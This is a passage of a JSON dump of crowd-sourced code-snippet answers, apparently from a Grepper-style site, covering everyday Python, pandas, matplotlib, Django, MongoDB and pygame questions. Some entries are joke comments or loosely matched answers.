    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2355,
    "keyword": null,
    "link": null,
    "title": " matplotlib title",
    "description": "import matplotlib.pyplot as plt  plt.title('TITLE')\nimport matplotlib. pyplot as plt A= [2,1,4,5]; B = [3,2,-2,1] plt.scatter(A,B) plt.title(\"title\", x=0.9, y=0.9) plt.xlabel(\"x-axis\") plt.ylabel(\"y-axis\") plt.show() \nimport matplotlib.pyplot as plt  fig, axs = plt.subplots(1, 2) axs[0].set_title('TITLE1')\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2356,
    "keyword": null,
    "link": null,
    "title": " matplotlib unable agg",
    "description": "%matplotlib inline\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2357,
    "keyword": null,
    "link": null,
    "title": " matplotlib wrap title",
    "description": "from textwrap import wrap import matplotlib.pyplot as plt  x=[1,2,3] y=[4,5,6] plt.figure(figsize=(10,10)) plt.plot(x, y, color='red') title='my extremely long title. I mean, really really long. Unbelievably long.' plt.title('\\n'.join(wrap(title,60)))\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2358,
    "keyword": null,
    "link": null,
    "title": " matplotlib x label rotation",
    "description": "plt.xticks(rotation=45)\nxticks(rotation=45) # rotate x-axis labels by 45 degrees. yticks(rotation=90) # rotate y-axis labels by 90 degrees.\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2359,
    "keyword": null,
    "link": null,
    "title": " matplotlib xticks font size",
    "description": "ax.tick_params(axis='both', which='major', labelsize=10)\nplt.xticks(fontsize=14, rotation=90)\nplt.xticks(fontsize=)\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2360,
    "keyword": null,
    "link": null,
    "title": " matplotlib y axis log scale",
    "description": "import pylab import matplotlib.pyplot as plt a = [pow(10, i) for i in range(10)] fig = plt.figure() ax = fig.add_subplot(2, 1, 1)  line, = ax.plot(a, color='blue', lw=2)  ax.set_yscale('log')  pylab.show()\n",
    "reg_date": "2021-10-12T11:31:37.000Z"
  },
  {
    "id": 2361,
    "keyword": null,
    "link": null,
    "title": " matrix pow python",
    "description": ">>> from numpy.linalg import matrix_power >>> i = np.array([[0, 1], [-1, 0]]) # matrix equiv. of the imaginary unit >>> matrix_power(i, 3) # should = -i array([[ 0, -1],        [ 1,  0]]) >>> matrix_power(i, 0) array([[1, 0],        [0, 1]]) >>> matrix_power(i, -3) # should = 1/(-i) = i, but w/ f.p. elements array([[ 0.,  1.],        [-1.,  0.]]) \n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2362,
    "keyword": null,
    "link": null,
    "title": " max columns in python",
    "description": "import pandas as pd pd.set_option('display.max_rows', 500) pd.set_option('display.max_columns', 500) pd.set_option('display.width', 1000)\nimport pandas as pd pd.set_option('display.max_rows', 500) pd.set_option('display.max_columns', 500) pd.set_option('display.width', 1000) \n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2363,
    "keyword": null,
    "link": null,
    "title": " max int value in python",
    "description": "import sys MAX_INT = sys.maxsize print(MAX_INT)  ''' NOTE: value of sys.maxsize is depend on the fact that how much bit a machine is. '''\nfloat('inf')\n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2364,
    "keyword": null,
    "link": null,
    "title": " max of a dict",
    "description": "dic={0: 1.4984074067880424, 1: 1.0984074067880423, 2: 1.8984074067880425, 3: 2.2984074067880425, 4: 2.2984074067880425} max_value = max(dic.values())  # maximum value max_keys = [k for k, v in dic.items() if v == max_value] # getting all keys containing the `maximum`  print(max_value, max_keys)\n# Basic syntax: key_with_max_value = max(dictionary, key=dictionary.get)  # Note, to get the max value itself, you can do either of the following: max_value = dictionary[max(dictionary, key=dictionary.get)] max_value = max(dictionary.values())  # Example usage: dictionary = {\"a\": 1, \"b\": 2, \"c\": 3} max(dictionary, key=dictionary.get) --> 'c'\n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2365,
    "keyword": null,
    "link": null,
    "title": " max of matrix numpy",
    "description": "# Get the maximum element from a Numpy array maxElement = numpy.amax(arr)   print('Max element from Numpy Array : ', maxElement) \n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2366,
    "keyword": null,
    "link": null,
    "title": " maximizar ventana tkinter python",
    "description": "root = Tk() root.attributes('-fullscreen', True) \nroot.state('zoomed')\n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2367,
    "keyword": null,
    "link": null,
    "title": " maximo numero de variables dentro de un .def python",
    "description": "print('hola putos\")\n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2368,
    "keyword": null,
    "link": null,
    "title": " mean of a column pandas",
    "description": "df[\"Column\"].mean()\ndf.mean(axis=0)#average for each column df.mean(axis=1)#average for each row \ndf[\"columnName\"].mean()\n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2369,
    "keyword": null,
    "link": null,
    "title": " mean of a list python",
    "description": "# Example to find average of list number_list = [45, 34, 10, 36, 12, 6, 80] avg = sum(number_list)/len(number_list) print(\"The average is \", round(avg,2)) \nimport numpy as np np.mean(list) np.std(list)\n# Python program to get average of a list  def Average(lst):  \treturn sum(lst) / len(lst)   # Driver Code  lst = [15, 9, 55, 41, 35, 20, 62, 49]  average = Average(lst)   # Printing average of the list  print(\"Average of the list =\", round(average, 2))   # Output: # Average of the list = 35.75\nlist = [15, 18, 2, 36, 12, 78, 5, 6, 9]  # for older versions of python average_method_one = sum(list) / len(list)  # for python 2 convert len to a float to get float division average_method_two = sum(list) / float(len(list))  # round answers using round() or ceil() print(average_method_one) print(average_method_two)\n #python3  def average(list):      result = sum(list) / len(list)      return result   list = [68,68,71,71,71,75,71,78,91,98,75,71,84] print(average(list))\nl = [15, 18, 2, 36, 12, 78, 5, 6, 9]  # By using the built-in statistics library import statistics statistics.mean(l)  # 20.11111111111111  # By defining a custom function def average(my_list):   return sum(my_list) / len(my_list) average(l) # 20.11111111111111\n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2370,
    "keyword": null,
    "link": null,
    "title": " mean squared error python",
    "description": "from sklearn.metrics import mean_squared_error mean_squared_error(y_true, y_pred)\nfrom sklearn.metrics import mean_squared_error    # Given values Y_true = [1,1,2,2,4]  # Y_true = Y (original values)    # calculated values Y_pred = [0.6,1.29,1.99,2.69,3.4]  # Y_pred = Y'    # Calculation of Mean Squared Error (MSE) mean_squared_error(Y_true,Y_pred) \n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2371,
    "keyword": null,
    "link": null,
    "title": " media url django",
    "description": "#urls.py from django.conf import settings from django.conf.urls.static import static  urlpatterns=[ # define all urls \t\t\t] urlpatterns += static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT)  #other method urlpatterns = patterns('',     # ... the rest of your URLconf goes here ... ) + static(settings.MEDIA_URL, document_root=settings.MEDIA_ROOT) \n{% load static %} <img src=\"{% static 'my_app/example.jpg' %}\" alt=\"My image\"> \n",
    "reg_date": "2021-10-12T11:31:38.000Z"
  },
  {
    "id": 2372,
    "keyword": null,
    "link": null,
    "title": " median of a list python",
    "description": "import statistics  lst = [1,3,6,13,27] median_value = statistics.median(lst) print(median_value) \nimport statistics  statistics.median(list_name)\n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2373,
    "keyword": null,
    "link": null,
    "title": " median of numpy array",
    "description": "arr = np.array([1, 2, 3, 4, 5])  np.median(arr)\n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2374,
    "keyword": null,
    "link": null,
    "title": " merge on index pandas",
    "description": "pd.merge(df1, df2, left_index=True, right_index=True) \nimport pandas as pd df1 = pd.DataFrame({'lkey': ['foo', 'bar', 'baz', 'foo'],                     'value': [1, 2, 3, 5]}) df2 = pd.DataFrame({'rkey': ['foo', 'bar', 'baz', 'foo'],                     'value': [5, 6, 7, 8]}) df1.merge(df2, left_on='lkey', right_on='rkey')\n>>> df1.merge(df2, left_on='lkey', right_on='rkey')   lkey  value_x rkey  value_y 0  foo        1  foo        5 1  foo        1  foo        8 2  foo        5  foo        5 3  foo        5  foo        8 4  bar        2  bar        6 5  baz        3  baz        7 \n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2375,
    "keyword": null,
    "link": null,
    "title": " merge two dictionaries in a single expression",
    "description": "z = {**x, **y}  #python 3.5 and above  z = x | y    #python 3.9+ ONLY  def merge_two_dicts(x, y): # python 3.4 or lower       z = x.copy()   # start with x's keys and values       z.update(y)    # modifies z with y's keys and values & returns None       return z\n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2376,
    "keyword": null,
    "link": null,
    "title": " message in django",
    "description": "{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>         {% if message.level == DEFAULT_MESSAGE_LEVELS.ERROR %}Important: {% endif %}         {{ message }}     </li>     {% endfor %} </ul> {% endif %} \nfrom django.contrib import messages  <--Change setting under settings.py from django.contrib.messages import constants as messages MESSAGE_TAGS = {     messages.ERROR: 'danger' } -->  {% for message in messages %} <div class=\"alert alert-{{ message.tags }} mb-0 alert-dismissible fade show\" role=\"alert\">   <strong>Message: </strong> {{ message }}   <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">     <span aria-hidden=\"true\">&times;</span>   </button> </div> {% endfor %}   <--Add message messages.debug(request, '%s SQL statements were executed.' % count) messages.info(request, 'Three credits remain in your account.') messages.success(request, 'Profile details updated.') messages.warning(request, 'Your account expires in three days.') messages.error(request, 'Document deleted.') -->\n{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>{{ message }}</li>     {% endfor %} </ul> {% endif %} \nfrom django.contrib import messages messages.add_message(request, messages.INFO, 'Hello world.') \nfrom django.contrib.messages import constants as messages MESSAGE_TAGS = {     messages.INFO: '',     50: 'critical', } \nfrom django.contrib.messages import constants as messages  MESSAGE_TAGS = {     messages.DEBUG: 'alert-info',     messages.INFO: 'alert-info',     messages.SUCCESS: 'alert-success',     messages.WARNING: 'alert-warning',     messages.ERROR: 'alert-danger', }\n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2377,
    "keyword": null,
    "link": null,
    "title": " message on member joining discord.py",
    "description": "@client.event async def on_member_join(member):     await member.send('Private message') \n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2378,
    "keyword": null,
    "link": null,
    "title": " messages django",
    "description": "{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>         {% if message.level == DEFAULT_MESSAGE_LEVELS.ERROR %}Important: {% endif %}         {{ message }}     </li>     {% endfor %} </ul> {% endif %} \nfrom django.contrib import messages  <--Change setting under settings.py from django.contrib.messages import constants as messages MESSAGE_TAGS = {     messages.ERROR: 'danger' } -->  {% for message in messages %} <div class=\"alert alert-{{ message.tags }} mb-0 alert-dismissible fade show\" role=\"alert\">   <strong>Message: </strong> {{ message }}   <button type=\"button\" class=\"close\" data-dismiss=\"alert\" aria-label=\"Close\">     <span aria-hidden=\"true\">&times;</span>   </button> </div> {% endfor %}   <--Add message messages.debug(request, '%s SQL statements were executed.' % count) messages.info(request, 'Three credits remain in your account.') messages.success(request, 'Profile details updated.') messages.warning(request, 'Your account expires in three days.') messages.error(request, 'Document deleted.') -->\n{% if messages %} <ul class=\"messages\">     {% for message in messages %}     <li{% if message.tags %} class=\"{{ message.tags }}\"{% endif %}>{{ message }}</li>     {% endfor %} </ul> {% endif %} \nfrom django.contrib import messages messages.add_message(request, messages.INFO, 'Hello world.') \nfrom django.contrib.messages import constants as messages MESSAGE_TAGS = {     messages.INFO: '',     50: 'critical', } \n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2379,
    "keyword": null,
    "link": null,
    "title": " middle value of a list in python",
    "description": "def findMiddle(input_list):     middle = float(len(input_list))/2     if middle % 2 != 0:         return input_list[int(middle - .5)]     else:         return (input_list[int(middle)], input_list[int(middle-1)]) \n[lis[i] for i in      range((len(lis)/2) - (1 if float(len(lis)) % 2 == 0 else 0), len(lis)/2+1)] \n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2380,
    "keyword": null,
    "link": null,
    "title": " miles to km in python",
    "description": "miles = 30 conversion_factor = 0.62137119  kilometers = miles / conversion_factor print kilometers\ntry:     Mile = int(input(\"Mile:- \"))     To_km = 1.60934*Mile     print(Mile,\"Mile = \",To_km,\"Km\") except:     print(\"Mile's must be number\")\nkilometers = 6 conversion_factor = 0.62137119  miles = kilometers / conversion_factor print miles\n",
    "reg_date": "2021-10-12T11:31:39.000Z"
  },
  {
    "id": 2381,
    "keyword": null,
    "link": null,
    "title": " min int python",
    "description": "import sys MAX_INT = sys.maxsize print(MAX_INT)  ''' NOTE: value of sys.maxsize is depend on the fact that how much bit a machine is. '''\nimport sys MIN_INT = -sys.maxsize - 1\n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2382,
    "keyword": null,
    "link": null,
    "title": " min max scaler sklearn",
    "description": "from sklearn.preprocessing import MinMaxScaler  scaler = MinMaxScaler() scaler.fit_transform(X_train) scaler.transform(X_test)\n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2383,
    "keyword": null,
    "link": null,
    "title": " minecraft",
    "description": "Best Game Ever - Upvote if you agree ;)\nprint(\"Playing minecraft is the only valid excuse for not coding\")\nMinecraft good game \nMINECRAFT CAVES AND CLIFFS UPDATE ROCKS! Upvote if you agree!  //Youtube: https://www.youtube.com/channel/UCBDHOr2HKOuMiWUj-Pu-AGA\nIt's understandable if you want to play minecraft rather than practicing coding. Perhaps you can get into Java Bukkit Plugins!\nA pretty good game mate.\nIt is good to take breaks from code\nyall should play this\nprint('best game') \nminecraft = \"good\" \n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2384,
    "keyword": null,
    "link": null,
    "title": " minecraft java port number",
    "description": "sudo fuser -k 8000/tcp\nUSE master GO xp_readerrorlog 0, 1, N'Server is listening on'  GO  #LogDate\tProcessInfo\tText #...\t\tServer\t\tServer is listening on [ ::1 <ipv6> 1434]. #2..\t\tServer\t\tServer is listening on [ 127.0.0.1 <ipv4> 1434].\n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2385,
    "keyword": null,
    "link": null,
    "title": " minesweeper",
    "description": "stop playing minesweeper and code.\n@Scary Shark, what if i coded minesweeper \nif playing_minesweeper() == \"True\" and responsibilities > 0:   do_your_work()\nhello, I just wanted to be part of the fun :)\nI love grepper\nhahahehea yeah minesweeper is pretty cool\n@Jolly Jellyfish, The councel has decided to accept your reasoning \n@Scary Shark I was programming minesweeper \n@Scary Shark you got me hahaha xD\nWhy is this game so addicting??? ;_;\n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2386,
    "keyword": null,
    "link": null,
    "title": " minimum and max value in all columns pandas",
    "description": "#for multiple columns  min_vals = df[[\"A\",\"B\",\"C\"]].min() #can add how much ever columns max_vals = df[[\"D\",\"E\",\"F\"]].max() #can add how much ever columns  #for single column min_val = df[\"Column\"].min()  max_val = df[\"Column\"].max()   #to refer to all columns min_val = df[:].min()  max_val = df[:].max() \nmax_value_column = df[\"column_name\"].max()\nmax_value = column.max()\n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2387,
    "keyword": null,
    "link": null,
    "title": " mish activation function tensorflow",
    "description": "import matplotlib.pyplot as plt %matplotlib inline  from __future__ import absolute_import from __future__ import division from __future__ import print_function  from keras.engine.base_layer import Layer from keras.layers import Activation, Dense from keras import backend as K from sklearn.model_selection import train_test_split from keras.datasets import mnist from keras.optimizers import SGD from keras.utils import np_utils from __future__ import print_function import keras from keras.models import Sequential from keras.layers.core import Flatten from keras.layers import Dropout from keras.layers import Conv2D, MaxPooling2D from keras.layers.normalization import BatchNormalization import numpy as np  class Mish(Layer):     '''     Mish Activation Function.     .. math::         mish(x) = x * tanh(softplus(x)) = x * tanh(ln(1 + e^{x}))     Shape:         - Input: Arbitrary. Use the keyword argument `input_shape`         (tuple of integers, does not include the samples axis)         when using this layer as the first layer in a model.         - Output: Same shape as the input.     Examples:         >>> X_input = Input(input_shape)         >>> X = Mish()(X_input)     '''      def __init__(self, **kwargs):         super(Mish, self).__init__(**kwargs)         self.supports_masking = True      def call(self, inputs):         return inputs * K.tanh(K.softplus(inputs))      def get_config(self):         base_config = super(Mish, self).get_config()         return dict(list(base_config.items()) + list(config.items()))      def compute_output_shape(self, input_shape):         return input_shape                def mish(x): \treturn keras.layers.Lambda(lambda x: x*K.tanh(K.softplus(x)))(x)    ###### Use in your model ##########    model.add(Dense(128,activation= mish))\n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2388,
    "keyword": null,
    "link": null,
    "title": " mix of multiple joins and multiple tables and multiple columns in python orm",
    "description": "query_result = session.query(models.Table1.col1.label('table1_col1'),                              models.Table1.col2.label('table1_col2'),                              models.Table2.col3.label('table2_col3'),                              models.Table2.col4.label('table2_col4'),                              models.Table3.col5.label('table3_col5'),                              models.Table3.col6.label('table3_col6'),                              models.Table4.col7.label('table4_col7'),                              models.Table5.col8.label('table5_col8')).join(   models.Table6, and_(models.Table6.<col>==models.Table2.<col>,                       models.Table2.<col>.in_(<list_of_values>)), isouter=False).join(   models.Table1, models.Table1.<col>==models.Table6.<col>, isouter=False).join(   models.Table3, and_(models.Table3.<col>==models.Table2.<col>,                       models.Table3.<col>==models.Table1.<col>), isouter=False).join(   models.Table4, models.Table4.<col>==models.Table3.<col>,   isouter=True).join(models.Table5,models.Table5.<col>==models.Table3.<col>,                      isouter=True) result = list(set(query_result.all()))\n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2389,
    "keyword": null,
    "link": null,
    "title": " mobile number regex python",
    "description": "(\\d{3}[-\\.\\s]??\\d{3}[-\\.\\s]??\\d{4}|\\(\\d{3}\\)\\s*\\d{3}[-\\.\\s]??\\d{4}|\\d{3}[-\\.\\s]??\\d{4}) \n",
    "reg_date": "2021-10-12T11:31:40.000Z"
  },
  {
    "id": 2390,
    "keyword": null,
    "link": null,
    "title": " mode imputation in python",
    "description": "df['country'].fillna(df['country'].mode()[0], inplace = True)\ncols = [\"workclass\", \"native-country\"] df[cols]=df[cols].fillna(df.mode().iloc[0]) \n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2391,
    "keyword": null,
    "link": null,
    "title": " mode of a list python",
    "description": "from collections import Counter data = Counter(your_list_in_here) data.most_common()   # Returns all unique items and their counts data.most_common(1)  # Returns the highest occurring item \nimport statistics statistics.mode(x)  #mean and median are also available.\nimport random numbers = [] limit = int(input(\"Please enter how many numbers you would like to compare:\\n\")) mode =0 for i in range(0,limit):     numbers.append(random.randint(1,10))  maxiumNum = max(numbers) j = maxiumNum + 1 count = [0]*j for i in range(j):     count[i]=0  for i in range(limit):     count[numbers[i]] +=1  n = count[0]  for i in range(1, j):     if (count[i] > n):         n = count[i]          mode = i    print(\"This is the mode = \"+str(mode)) print(\"This is the array = \"+str(numbers))  \n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2392,
    "keyword": null,
    "link": null,
    "title": " model.predict([x test]) error",
    "description": "Just put model.predict(x_test) instead of model.predict([x_test])\n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2393,
    "keyword": null,
    "link": null,
    "title": " model load pytorch",
    "description": "model = TheModelClass(*args, **kwargs) model.load_state_dict(torch.load(PATH)) model.eval() \nSaving: \ttorch.save(model, PATH)   Loading:  \tmodel = torch.load(PATH) \tmodel.eval()\n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2394,
    "keyword": null,
    "link": null,
    "title": " model pickle file create",
    "description": "import pickle  # save the model to disk filename = 'finalized_model.sav' pickle.dump(model, open(filename, 'wb'))   # some time later...   # load the model from disk loaded_model = pickle.load(open(filename, 'rb')) result = loaded_model.score(X_test, Y_test) print(result)\n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2395,
    "keyword": null,
    "link": null,
    "title": " modify dict key name python",
    "description": "a_dict[new_key] = a_dict.pop(old_key)\n>>> dictionary = { 1: 'one', 2:'two', 3:'three' } >>> dictionary['ONE'] = dictionary.pop(1) >>> dictionary {2: 'two', 3: 'three', 'ONE': 'one'} >>> dictionary['ONE'] = dictionary.pop(1) Traceback (most recent call last):   File \"<input>\", line 1, in <module> KeyError: 1\n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2396,
    "keyword": null,
    "link": null,
    "title": " module 'cv2' has no 'videocapture' member python",
    "description": "\"python.linting.pylintArgs\":[\"--extension-pkg-whitelist=cv2\"] \n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2397,
    "keyword": null,
    "link": null,
    "title": " module 'cv2.cv2' has no attribute 'imWrite'",
    "description": "pip install opencv-contrib-python\n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2398,
    "keyword": null,
    "link": null,
    "title": " module 'datetime' has no attribute 'strptime'",
    "description": "Use this: from datetime import datetime instead of Import datetime\n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2399,
    "keyword": null,
    "link": null,
    "title": " module 'tensorflow' has no attribute 'reset default graph'",
    "description": "import tensorflow as tf tf.compat.v1.reset_default_graph()\nfrom tensorflow.python.framework import ops ops.reset_default_graph()\nreset_default_graph\n",
    "reg_date": "2021-10-12T11:31:41.000Z"
  },
  {
    "id": 2400,
    "keyword": null,
    "link": null,
    "title": " module 'tensorflow core.compat.v1.random' has no attribute 'set seed'",
    "description": "tf.random.set_random_seed(seed)\n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2401,
    "keyword": null,
    "link": null,
    "title": " module pygame has no member",
    "description": "\"\"\"If you are using pylint on Visual Studio Code write this line at the beginning of the program :\"\"\"  # pylint: disable=no-member  \"\"\"the rest of the program :\"\"\"  x = bla bla ....\n\"python.linting.pylintArgs\": [     \"--extension-pkg-whitelist=lxml\"  // The extension is \"lxml\" not \"1xml\" ]\n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2402,
    "keyword": null,
    "link": null,
    "title": " module subprocess has no attribute popen",
    "description": "You are probably shadowing the built in subprocess.py with your own file. Do not name your files the same thing as the externals you are importing.\n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2403,
    "keyword": null,
    "link": null,
    "title": " module to read keyboard",
    "description": "import keyboard  # using module keyboard while True:  # making a loop     try:  # used try so that if user pressed other than the given key error will not be shown         if keyboard.is_pressed('q'):  # if key 'q' is pressed              print('You Pressed A Key!')             break  # finishing the loop     except:         break  # if user pressed a key other than the given key the loop will break\n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2404,
    "keyword": null,
    "link": null,
    "title": " module turtle has no forward member",
    "description": "from turtle import Screen, Turtle  screen = Screen()  turtle = Turtle()  turtle.forward(100)  screen.mainloop()\n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2405,
    "keyword": null,
    "link": null,
    "title": " mongodb aggregate count",
    "description": "#return the number of documents whose \"field\" field has a value of A  query = db.collection.aggregate([{           \"$match\": {             \"field\": \"A\"           }         },{           \"$count\": \"number of occurrences\" }])\ndb.collection.countDocuments( <query>, <options> )\n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2406,
    "keyword": null,
    "link": null,
    "title": " mongodb group by having",
    "description": "#It's the equivalent of the following SQL instruction: # SELECT COUNT(*) FROM Table # GROUP BY your_field # HAVING COUNT(*) > N query = db.collection.aggregate([      {        \"$group\": { \"_id\": \"$your_field\", #GROUP BY your_field     \t\t\t\"count\": {\"$sum\":1} }   #COUNT(*)     },          { \"$match\": { \"count\": { \"$gt\": N } } } #HAVING COUNT(*) > N ])\ndb.sales.aggregate([   // First Stage   {     $match : { \"date\": { $gte: new ISODate(\"2014-01-01\"), $lt: new ISODate(\"2015-01-01\") } }   },   // Second Stage   {     $group : {        _id : { $dateToString: { format: \"%Y-%m-%d\", date: \"$date\" } },        totalSaleAmount: { $sum: { $multiply: [ \"$price\", \"$quantity\" ] } },        averageQuantity: { $avg: \"$quantity\" },        count: { $sum: 1 }     }   },   // Third Stage   {     $sort : { totalSaleAmount: -1 }   }  ]) \n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2407,
    "keyword": null,
    "link": null,
    "title": " mongodb python get all documents",
    "description": "from pymongo import MongoClient  if __name__ == '__main__':     client = MongoClient(\"localhost\", 27017, maxPoolSize=50)     db = client.localhost     collection = db['chain']     cursor = collection.find({})     for document in cursor:           print(document)\n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2408,
    "keyword": null,
    "link": null,
    "title": " month from datetime pandas",
    "description": "#Exctract month and create a dedicated column df[\"Month\"] from a  #column in datetime format df[\"Date\"] df['Month'] = pd.DatetimeIndex(df['Date']).month  \n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2409,
    "keyword": null,
    "link": null,
    "title": " months list python",
    "description": "['January', 'February', 'March', 'April', 'May', 'June','July', 'August', 'September', 'October', 'November','December']\n['Dec', 'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov'] \n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2410,
    "keyword": null,
    "link": null,
    "title": " monty python and the holy grail",
    "description": "print(\"Ni!\")\n__code-examples__python__monty_python_and_the_holy_grail__?\nprint(\"Ni!\")\n",
    "reg_date": "2021-10-12T11:31:42.000Z"
  },
  {
    "id": 2411,
    "keyword": null,
    "link": null,
    "title": " most frequent word in a list python",
    "description": "words = [    'red', 'green', 'black', 'pink', 'black', 'white', 'black', 'eyes',    'white', 'black', 'orange', 'pink', 'pink', 'red', 'red', 'white', 'orange',    'white', \"black\", 'pink', 'green', 'green', 'pink', 'green', 'pink',    'white', 'orange', \"orange\", 'red' ] from collections import Counter word_counts = Counter(words) top_four = word_counts.most_common(4) print(top_four)  \nfrom collections import Counter  a = [1936, 2401, 2916, 4761, 9216, 9216, 9604, 9801]   c = Counter(a)  print(c.most_common(1)) # the one most common element... 2 would mean the 2 most common [(9216, 2)] # a set containing the element, and it's count in 'a'\n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2412,
    "keyword": null,
    "link": null,
    "title": " mouse in pygame",
    "description": "pygame.mouse.get_pos() #-> get the mouse cursor position on the screen in taple #-> (x, y)  if event.type == pygame.MOUSEBUTTONDOWN:     print(event.button)  #------------------------# 1 - left click 2 - middle click 3 - right click 4 - scroll up 5 - scroll down #------------------------#\nx,y = pygame.mouse.get_pos() #get the mouse cursor position #get_pos() -> (x, y) #Returns the X and Y position of the mouse cursor. #The position is relative to the top-left corner of the display. #The cursor position can be located outside of the display window, #but is always constrained to the screen.\n pygame.mouse.get_pos()     get the mouse cursor position     get_pos() -> (x, y)      Returns the x and y position of the mouse cursor.      The position is relative to the top-left corner of the display.      The cursor position can be located outside of the display window,     but is always constrained to the screen.\n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2413,
    "keyword": null,
    "link": null,
    "title": " move cursor in python",
    "description": "import sys   def write(string: str, flush: bool=True) -> None:   sys.stdout.write(string)   if flush:     sys.stdout.flush()   # up: \\x1b[{n}A # down: \\x1b[{n}B # right: \\x1b[{n}C # left: \\x1b[{n}D  # have you noticed that in python when you hit use the arrow # keys in an input, you get this weird output? # ^[[A # ^[[B # ^[[C # ^[[D # now you'll understand why. when you type something an input, # it literally just prints out everything you type. if you type # a newline character though, it will return the text from the # input stream to the program. when you type a \"move up\", \"move down\", # or etc character, the function knows that the character is not # a newline character, so it just writes it to the console. this # is why you see stuff like ^[[A when you use the arrow keys on # your keyboard when typing in the input function  write('type ur name below\\n\\nhit enter when you\\'re done') # we will read the user's name from the input stream in between # the two newlines write('\\x1b[1A') # move up one space write('\\x1b[26D') # move left 26 spaces name = sys.stdin.readline() # read the user's name write('\\x1b[1B') # move down 1 space write(name) # write the user's name to the console output\nimport mouse mouse.move(9,45)\n",
    "reg_date": "2021-10-12T11:31:43.000Z"
  },
  {
    "id": 2414,
    "keyword": null,
    "link": null,
    "title": " movement in godot",
